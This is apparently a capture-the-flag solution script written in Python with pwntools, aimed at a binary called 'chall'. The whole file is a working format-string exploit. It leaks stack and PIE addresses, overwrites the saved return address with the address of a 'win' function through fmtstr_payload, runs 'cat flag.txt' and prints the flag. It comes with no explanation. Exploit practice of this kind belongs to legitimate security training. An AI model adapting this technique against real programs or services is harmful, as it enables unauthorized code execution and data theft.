#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

if not args.REMOTE:
    libc = exe.libc

HOST, PORT = "localhost", 3000

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True
STACK_LEAK_FMT_OFFSET = 21
PIE_LEAK_FMT_OFFSET = 19
CONTROL_FMT_OFFSET = 6
RETADDR_OFFSET = 0x110
PIE_OFFSET = exe.sym.main

# Lambdas

b = lambda s: s.encode()

def main():
    global io

    io = conn()

    io.recvline()

    # Leak stack and PIE

    payload = b(f"%{STACK_LEAK_FMT_OFFSET}$p,%{PIE_LEAK_FMT_OFFSET}$p|")
    sendp(payload)
    stack_leak, pie_leak = [ int(x, 16) for x in io.recvuntil(b"|", drop=True).split(b",") ]

    retaddr_stack = leak(stack_leak, RETADDR_OFFSET, "return")
    exe.address = leak(pie_leak, PIE_OFFSET, "binary")

    # Write @win in return address of stack

    writes = {
        retaddr_stack: exe.sym.win,
    }
    payload = fmtstr_payload(CONTROL_FMT_OFFSET, writes=writes, write_size="short")
    sendp(payload)

    sendp(b"exit")
    io.recvline()

    io.sendline(b"cat flag.txt")
    flag = io.recvline().strip().decode()

    log.success(f"Flag: {flag}")

    io.interactive()

def sendp(payload):
    check(len(payload) < 0x50)
    io.recvuntil(b"> ")
    io.sendline(payload)

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    if type(buf) == int:
        leak_addr = buf
    else:
        leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
